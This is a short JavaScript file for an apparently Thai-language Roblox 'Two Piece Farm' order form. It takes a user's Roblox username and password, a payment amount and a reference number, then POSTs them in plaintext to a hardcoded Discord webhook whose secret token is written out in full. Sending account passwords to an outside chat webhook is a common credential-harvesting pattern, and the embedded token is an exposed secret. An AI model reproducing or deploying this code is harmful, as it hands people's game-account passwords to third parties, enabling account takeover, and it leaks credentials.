let twopiecesubmit = document.getElementById('twopiecesubmit')
let twopieceuser = document.getElementById('twopieceuser')
let twopiecepass = document.getElementById('twopiecepass')
let twopiecemoney = document.getElementById('twopiecemoney')
let twopiecerefer = document.getElementById('twopiecerefer')
let twopieceexplain = document.getElementById('twopieceexplain')

function SendTwopiece()
{
    if (twopiecemoney.value < 25)
    {
        alert('เงินของคุณไม่เพียงพอ')
    }
    else
    {
        if (twopieceuser.value == "")
        {
            alert('ชื่อผู้ใช้ไม่ถูกต้อง')
        }
        else
        {
            if ((twopiecepass.value).length < 8)
        {
            alert('รหัสผ่านไม่ถูกต้อง')
        }
        else
        {
            if ((twopiecerefer.value).length < 14)
            {
                alert('เลขอ้างอิงไม่ถูกต้อง')
            }
            else
            {
                if ((twopiecerefer.value).length > 14)
                {
                    alert('เลขอ้างอิงไม่ถูกต้อง')
                }
                else
                {
                    const url = "https://discord.com/api/webhooks/804936737133559838/olXB1E-_QjpkVjmyst_6GXa3pwedY3JBIt-tO6KwN-cX0Ybe_aLu-bUKGypVcnE4D_o3"
                const msg = 
                {
                "content": null,
                "embeds": [
                {
                    "title": "Two Piece Farm",
                    "description": "ชื่อผู้ใช้ Roblox : " + twopieceuser.value + "\nรหัสผ่าน Roblox  : " + twopiecepass.value + "\nจำนวนเงิน : " + twopiecemoney.value + "\nเลขอ้างอิง : " + twopiecerefer.value + "\nคำอธิบาย : " + twopieceexplain.value,
                    "color": 16763904
                }
                ],
                    "username": "Two Piece"
            }

            fetch(url,{"method":"POST","headers": {"content-type":"application/json"},"body":JSON.stringify(msg)})
            alert('เสร็จสิ้น! กรุณารอแอดมินทำงาน')
                }
            }
        }
        }
    }
}

twopiecesubmit.addEventListener('click' , SendTwopiece)